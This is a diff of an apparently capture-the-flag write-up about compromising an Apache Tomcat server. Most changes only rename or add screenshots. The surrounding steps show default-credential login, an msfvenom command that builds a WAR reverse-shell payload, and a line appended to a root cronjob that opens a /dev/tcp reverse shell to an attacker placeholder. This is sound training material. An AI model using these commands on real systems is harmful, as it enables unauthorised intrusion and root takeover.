@@ -10,7 +10,7 @@ Open ports: `22 ssh`, `8080 http` and `8009 ajp13`
 
 Default Apache Tomcat webpage:
 
-![website](imgs/website.png "website")
+![webpage](imgs/webpage.png "webpage")
 
 Using gobuster to enumerate hidden directories
 
@@ -33,13 +33,15 @@ Now trying other default credentials suggested by the site, `tomcat`:`s3cret`, a
 
 We can see admin panel
 
-![cancel](imgs/cancel.png "cancel")
+![manager](imgs/manager.png "manager")
 
 We are able to submit `.war` files, so i will create a payload that executes reverse shell using `msfvenom`
 
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LPORT=9999 LHOST=<ATTACKER IP> -f war -o shell.war  
 ```
+
+![npayload](imgs/npayload.png "npayload")
 
 Now i upload `shell.war`, start nc listener and go to `http://IP:8080/shell`
 
@@ -54,11 +56,12 @@ Now checking `id.sh`, the script is run as cronjob so it is our privilage escala
 
 ![cron](imgs/cron.png "cron")
 
-Using simple command to generate another reverse shell this time as root
+Using simple command to add another line in id.sh to generate another reverse shell this time as root
 
 ```
 echo "sh -i >& /dev/tcp/<ATTACKER IP>/4444 0>&1" >> id.sh
 ```
+![nid](imgs/nid.png "nid")
 
 Now we need to wait for script to execute
 
